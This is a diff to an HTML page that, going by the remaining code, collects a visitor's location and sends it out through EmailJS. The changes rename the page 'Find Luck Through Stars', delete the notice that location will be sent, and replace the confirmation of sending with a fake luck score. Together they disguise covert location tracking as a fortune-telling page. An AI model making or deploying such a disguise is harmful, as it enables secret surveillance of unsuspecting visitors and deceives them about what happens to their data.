@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Location Permission</title>
+  <title>Luck</title>
 
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
@@ -23,14 +23,13 @@
 </head>
 
 <body>
-  <h1>Location Permission</h1>
+  <h1>Find Luck Through Stars</h1>
 
   <p>
-    This page will ask for your location. Your location will only be sent
-    if you select “Allow”.
+    
   </p>
 
-  <p id="status">Requesting location permission...</p>
+  <p id="status"></p>
 
   <script>
     const EMAILJS_PUBLIC_KEY = "vdXmhe_duYHT5y0qd";
@@ -79,7 +78,7 @@
             );
 
             status.textContent =
-              "Location received and sent successfully.";
+              "Your Luck Today Will Be 10/10";
           } catch (error) {
             console.error("EmailJS error:", error);
 
